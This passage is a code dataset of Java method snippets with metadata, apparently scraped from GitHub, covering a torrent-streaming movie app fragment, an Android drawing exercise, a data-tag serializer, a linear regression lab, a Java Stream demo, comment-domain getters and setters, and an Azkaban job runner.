onServerReady(mService.getCurrentStreamUrl());\n        }\n\n        if(mState == null) {\n            setState(State.WAITING_TORRENT);\n        } else {\n            setState(mState);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32240, "method_name": "startStream", "class_name": "BaseStreamLoadingFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void startStream() {\n        if (null == mService) throw new IllegalStateException(\"Torrent service must be bound\");\n        String torrentUrl = mStreamInfo.getTorrentUrl();\n\n        //if the torrent service is currently streaming another file, stop it.\n        if (mService.isStreaming() && !mService.getCurrentTorrentUrl().equals(torrentUrl)) {\n            mService.stopStreaming();\n        } else if(mService.isReady()) {\n            onStreamReady(mService.getCurrentTorrent());\n            onServerReady(mService.getCurrentStreamUrl());\n        }\n\n        //start streaming the new file\n        mService.streamTorrent(torrentUrl);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32241, "method_name": "cancelStream", "class_name": "BaseStreamLoadingFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void cancelStream() {\n        if (mService != null) {\n            mService.stopStreaming();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32242, "method_name": "onStreamStarted", "class_name": "BaseStreamLoadingFragment", "params": ["Torrent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamStarted(Torrent torrent) {\n        setState(State.BUFFERING);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32243, "method_name": "onStreamError", "class_name": "BaseStreamLoadingFragment", "params": ["Torrent", "Exception"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamError(Torrent torrent, final Exception e) {\n        if (e.getMessage().equals(\"Write error\")) {\n            setState(State.ERROR, getString(R.string.error_files));\n        } else if (e.getMessage().equals(\"Torrent error\")) {\n            setState(State.ERROR, getString(R.string.torrent_failed));\n        } else {\n            setState(State.ERROR, getString(R.string.unknown_error));\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32244, "method_name": "onStreamReady", "class_name": "BaseStreamLoadingFragment", "params": ["Torrent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamReady(Torrent torrent) { }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32245, "method_name": "onServerReady", "class_name": "BaseStreamLoadingFragment", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onServerReady(String url) {\n        startPlayer(url);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32246, "method_name": "onStreamProgress", "class_name": "BaseStreamLoadingFragment", "params": ["Torrent", "StreamStatus"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamProgress(Torrent torrent, StreamStatus status) {\n        if (!mVideoLocation.isEmpty()) {\n            startPlayer(mVideoLocation);\n        }\n        setState(State.STREAMING, status);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32247, "method_name": "onStreamPrepared", "class_name": "BaseStreamLoadingFragment", "params": ["Torrent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamPrepared(Torrent torrent) { }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32248, "method_name": "onStreamStopped", "class_name": "BaseStreamLoadingFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamStopped() {\n\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32249, "method_name": "loadSubtitles", "class_name": "BaseStreamLoadingFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void loadSubtitles() {\n        Media media = mStreamInfo.getMedia();\n        if (media == null) return;\n\n        SubsProvider subsProvider = providerManager.getCurrentSubsProvider();\n        if (subsProvider == null) return;\n\n        if (mStreamInfo.isShow()) {\n            subsProvider.getList((Episode) media, this);\n        }\n        else {\n            subsProvider.getList((Movie) media, this);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32250, "method_name": "onSuccess", "class_name": "BaseStreamLoadingFragment", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSuccess(Map<String, String> items) {\n        Media media = mStreamInfo.getMedia();\n        media.subtitles = items;\n\n        mSubsStatus = SubsStatus.SUCCESS;\n        mHasSubs = false;\n\n        if (media.subtitles == null || media.subtitles.size() == 0) return;\n\n        if (mStreamInfo.getSubtitleLanguage() == null) {\n            if (media.subtitles.containsKey(PrefUtils.get(getActivity(), Prefs.SUBTITLE_DEFAULT, SubsProvider.SUBTITLE_LANGUAGE_NONE))) {\n                mStreamInfo.setSubtitleLanguage(PrefUtils.get(getActivity(), Prefs.SUBTITLE_DEFAULT, SubsProvider.SUBTITLE_LANGUAGE_NONE));\n            }\n            else {\n                mStreamInfo.setSubtitleLanguage(SubsProvider.SUBTITLE_LANGUAGE_NONE);\n            }\n        }\n\n        if (mStreamInfo.getSubtitleLanguage() != null && !mStreamInfo.getSubtitleLanguage().equals(SubsProvider.SUBTITLE_LANGUAGE_NONE)) {\n            String mSubtitleLanguage = mStreamInfo.getSubtitleLanguage();\n            mSubsStatus = SubsStatus.DOWNLOADING;\n            mHasSubs = true;\n            SubtitleDownloader subtitleDownloader = new SubtitleDownloader(providerManager.getCurrentSubsProvider(),\n                    getActivity(), mStreamInfo, mSubtitleLanguage);\n            subtitleDownloader.setSubtitleDownloaderListener(this);\n            subtitleDownloader.downloadSubtitle();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32251, "method_name": "onFailure", "class_name": "BaseStreamLoadingFragment", "params": ["Exception"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onFailure(Exception e) {\n        mSubsStatus = SubsStatus.FAILURE;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32252, "method_name": "onSubtitleDownloadCompleted", "class_name": "BaseStreamLoadingFragment", "params": ["boolean", "TimedTextObject"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSubtitleDownloadCompleted(boolean isSuccessful, TimedTextObject subtitleFile) {\n        mSubsStatus = isSuccessful ? SubsStatus.SUCCESS : SubsStatus.FAILURE;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32253, "method_name": "onDraw", "class_name": "Practice4DrawPointView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n//        \u7ec3\u4e60\u5185\u5bb9\uff1a\u4f7f\u7528 canvas.drawPoint() \u65b9\u6cd5\u753b\u70b9\n//        \u4e00\u4e2a\u5706\u70b9\uff0c\u4e00\u4e2a\u65b9\u70b9\n//        \u5706\u70b9\u548c\u65b9\u70b9\u7684\u5207\u6362\u4f7f\u7528 paint.setStrokeCap(cap)\uff1a`ROUND` \u662f\u5706\u70b9\uff0c`BUTT` \u6216 `SQUARE` \u662f\u65b9\u70b9\n        paint.setStrokeCap(Paint.Cap.ROUND);\n        paint.setStrokeWidth(20);\n        paint.setColor(Color.BLACK);\n        canvas.drawPoint(100, 100, paint);\n\n        paint.setStrokeCap(Paint.Cap.SQUARE);\n        canvas.drawPoint(200, 100, paint);\n\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson1/Practice4DrawPointView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 32254, "method_name": "setValue", "class_name": "FloatTag", "params": ["Float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValue(Float s) {\n        this.value = s;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/FloatTag.java", "stars": "2", "class_props": {"extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"id": 32255, "method_name": "getValue", "class_name": "FloatTag", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Float", "snippet": "    public Float getValue() {\n        return value;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/FloatTag.java", "stars": "2", "class_props": {"extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"id": 32256, "method_name": "setName", "class_name": "FloatTag", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/FloatTag.java", "stars": "2", "class_props": {"extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"id": 32257, "method_name": "getName", "class_name": "FloatTag", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/FloatTag.java", "stars": "2", "class_props": {"extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"id": 32258, "method_name": "writeData", "class_name": "FloatTag", "params": ["DataOutputStream"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeData(DataOutputStream dos) throws IOException {\n        // Indicates the string\n        dos.write(getID());\n        //Create a new DataOutputStream\n        ByteArrayOutputStream os = new ByteArrayOutputStream();\n        CountingOutputStream cos = new CountingOutputStream(os);\n        DataOutputStream tempDos = new DataOutputStream(cos);\n\n        tempDos.writeShort(name.getBytes(StandardCharsets.UTF_8).length);\n        tempDos.write(name.getBytes(StandardCharsets.UTF_8));\n        tempDos.writeFloat(value);\n\n        dos.writeInt(cos.getCount());\n        dos.write(os.toByteArray());\n        tempDos.close();\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/FloatTag.java", "stars": "2", "class_props": {"extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"id": 32259, "method_name": "createFromData", "class_name": "FloatTag", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "Tag<Float>", "snippet": "    public Tag<Float> createFromData(byte[] value) {\n        ByteBuffer wrappedFloat = ByteBuffer.wrap(value);\n        this.value = wrappedFloat.getFloat();\n        wrappedFloat.clear();\n        return this;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/FloatTag.java", "stars": "2", "class_props": {"extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"id": 32260, "method_name": "getID", "class_name": "FloatTag", "params": [], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte getID() {\n        return 3;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/FloatTag.java", "stars": "2", "class_props": {"extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"id": 32261, "method_name": "calculate", "class_name": "LsLinearRegression", "params": ["double", "double", "double", "int", "DoubleUnaryOperator"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String calculate(double searched, double start, double end, int n, DoubleUnaryOperator function) throws Exception {\n        validate(searched, start, end, n);\n\n        var points = arrayPoints(start, end, n, function);\n        var xs = points.getKey();\n        var ys = points.getValue();\n\n        var length = points.getKey().length;\n\n        var xMid = Arrays.stream(xs).average().orElse(Double.NaN);\n        var yMid = Arrays.stream(ys).average().orElse(Double.NaN);\n\n        var xx = 0.0;\n        var xy = 0.0;\n\n        for (int i = 0; i < length; i++) {\n            var dX = (xs[i] - xMid);\n\n            xx += Math.pow(dX, 2);\n            xy += dX * (ys[i] - yMid);\n        }\n\n        if (xx == 0)\n            xx = Math.pow(1, -10);\n\n        var slope = xy / xx;\n        var intercept = yMid - slope * xMid;\n\n        DoubleUnaryOperator y = (double x) -> slope * x + intercept;\n        return \"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442: \" + y.applyAsDouble(searched);\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/nmlab6/regression/LsLinearRegression.java", "stars": "2", "class_props": {"extends": null, "implements": ["Regression"], "modifiers": ["public"]}}, {"id": 32262, "method_name": "main", "class_name": "Demo01GetStream", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u628a\u96c6\u5408\u8f6c\u6362\u4e3aStream\u6d41\n        List<String> list = new ArrayList<>();\n        Stream<String> stream1 = list.stream();\n\n        Set<String> set = new HashSet<>();\n        Stream<String> stream2 = set.stream();\n\n        Map<String,String> map = new HashMap<>();\n        //\u83b7\u53d6\u952e,\u5b58\u50a8\u5230\u4e00\u4e2aSet\u96c6\u5408\u4e2d\n        Set<String> keySet = map.keySet();\n        Stream<String> stream3 = keySet.stream();\n\n        //\u83b7\u53d6\u503c,\u5b58\u50a8\u5230\u4e00\u4e2aCollection\u96c6\u5408\u4e2d\n        Collection<String> values = map.values();\n        Stream<String> stream4 = values.stream();\n\n        //\u83b7\u53d6\u952e\u503c\u5bf9(\u952e\u4e0e\u503c\u7684\u6620\u5c04\u5173\u7cfb entrySet)\n        Set<Map.Entry<String, String>> entries = map.entrySet();\n        Stream<Map.Entry<String, String>> stream5 = entries.stream();\n\n        //\u628a\u6570\u7ec4\u8f6c\u6362\u4e3aStream\u6d41\n        Stream<Integer> stream6 = Stream.of(1, 2, 3, 4, 5);\n        //\u53ef\u53d8\u53c2\u6570\u53ef\u4ee5\u4f20\u9012\u6570\u7ec4\n        Integer[] arr = {1,2,3,4,5};\n        Stream<Integer> stream7 = Stream.of(arr);\n        String[] arr2 = {\"a\",\"bb\",\"ccc\"};\n        Stream<String> stream8 = Stream.of(arr2);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo02/Stream/Demo01GetStream.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32263, "method_name": "getCoid", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getCoid() {\n        return coid;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32264, "method_name": "setCoid", "class_name": "CommentDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCoid(Integer coid) {\n        this.coid = coid;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32265, "method_name": "getCid", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getCid() {\n        return cid;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32266, "method_name": "setCid", "class_name": "CommentDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCid(Integer cid) {\n        this.cid = cid;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32267, "method_name": "getCreated", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getCreated() {\n        return created;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32268, "method_name": "setCreated", "class_name": "CommentDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreated(Integer created) {\n        this.created = created;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32269, "method_name": "getAuthor", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAuthor() {\n        return author;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32270, "method_name": "setAuthor", "class_name": "CommentDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthor(String author) {\n        this.author = author;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32271, "method_name": "getAuthorId", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getAuthorId() {\n        return authorId;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32272, "method_name": "setAuthorId", "class_name": "CommentDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthorId(Integer authorId) {\n        this.authorId = authorId;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32273, "method_name": "getOwnerId", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getOwnerId() {\n        return ownerId;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32274, "method_name": "setOwnerId", "class_name": "CommentDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOwnerId(Integer ownerId) {\n        this.ownerId = ownerId;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32275, "method_name": "getMail", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMail() {\n        return mail;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32276, "method_name": "setMail", "class_name": "CommentDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMail(String mail) {\n        this.mail = mail;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32277, "method_name": "getUrl", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUrl() {\n        return url;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32278, "method_name": "setUrl", "class_name": "CommentDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUrl(String url) {\n        this.url = url;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32279, "method_name": "getIp", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getIp() {\n        return ip;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32280, "method_name": "setIp", "class_name": "CommentDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIp(String ip) {\n        this.ip = ip;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32281, "method_name": "getAgent", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAgent() {\n        return agent;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32282, "method_name": "setAgent", "class_name": "CommentDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAgent(String agent) {\n        this.agent = agent;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32283, "method_name": "getType", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getType() {\n        return type;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32284, "method_name": "setType", "class_name": "CommentDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(String type) {\n        this.type = type;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32285, "method_name": "getStatus", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getStatus() {\n        return status;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32286, "method_name": "setStatus", "class_name": "CommentDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStatus(String status) {\n        this.status = status;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32287, "method_name": "getParent", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getParent() {\n        return parent;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32288, "method_name": "setParent", "class_name": "CommentDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setParent(Integer parent) {\n        this.parent = parent;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32289, "method_name": "getContent", "class_name": "CommentDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getContent() {\n        return content;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32290, "method_name": "setContent", "class_name": "CommentDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContent(String content) {\n        this.content = content;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/CommentDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32291, "method_name": "run", "class_name": "AzkabanDssJobType", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() throws Exception {\n\n        info(\"Start to execute job\");\n        logJobProperties();\n        this.job = JobBuilder.getAzkanbanBuilder().setJobProps(this.jobPropsMap).build();\n        this.job.setLogObj(new AzkabanAppjointLog(this.log));\n        if(JobTypeEnum.EmptyJob == ((LinkisJob)this.job).getJobType()){\n            this.log.warn(\"This node is empty type\");\n            return;\n        }\n        LinkisNodeExecutionImpl.getLinkisNodeExecution().runJob(this.job);\n        LinkisNodeExecutionImpl.getLinkisNodeExecution().waitForComplete(this.job);\n\n        LinkisExecutionListener listener = (LinkisExecutionListener)LinkisNodeExecutionImpl.getLinkisNodeExecution();\n        listener.onStatusChanged(null,  LinkisNodeExecutionImpl.getLinkisNodeExecution().getState(this.job),this.job);\n        int resultSize =  LinkisNodeExecutionImpl.getLinkisNodeExecution().getResultSize(this.job);\n        for(int i =0; i < resultSize; i++){\n            this.log.info(\"The content of the \" + (i + 1) + \"th resultset is :\"\n                    +  LinkisNodeExecutionImpl.getLinkisNodeExecution().getResult(this.job, i, LinkisJobExecutionConfiguration.RESULT_PRINT_SIZE.getValue(this.jobPropsMap)));\n        }\n\n        info(\"Finished to execute job\");\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/util/AzkabanDssJobType.java", "stars": "18", "class_props": {"extends": "AbstractJob", "implements": null, "modifiers": ["public"]}}, {"id": 32292, "method_name": "cancel", "class_name": "AzkabanDssJobType", "params": [], "throws": ["Exception"], 